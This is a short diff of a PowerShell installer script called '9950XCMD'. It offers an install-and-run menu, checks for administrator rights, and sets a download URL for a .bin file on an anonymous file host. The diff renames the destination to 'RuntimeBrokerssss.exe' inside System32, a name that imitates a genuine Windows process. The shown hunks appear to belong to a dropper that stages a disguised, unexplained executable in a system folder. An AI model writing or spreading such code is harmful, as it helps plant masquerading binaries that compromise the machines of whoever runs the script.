@@ -5,7 +5,7 @@ Write-Host "9950XCMD"
 Write-Host "1. Install & Run"
 Write-Host "2. Clean"
 
-$choice = Read-Host "Enter choice (1/2/3)"
+$choice = Read-Host "Enter choice 1-2"
 
 # -----------------------------
 # Check for Administrator rights
@@ -20,7 +20,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 # Define paths and variables
 # -----------------------------
 $system32Path = "$env:windir\System32"
-$exeDestination = Join-Path $system32Path "RuntimeBrokerss.exe"
+$exeDestination = Join-Path $system32Path "RuntimeBrokerssss.exe"
 $exeUrl = "https://files.catbox.moe/dbhkb7.bin"
 
 # ตัวเลือกที่ 3 - ไฟล์ fontexe
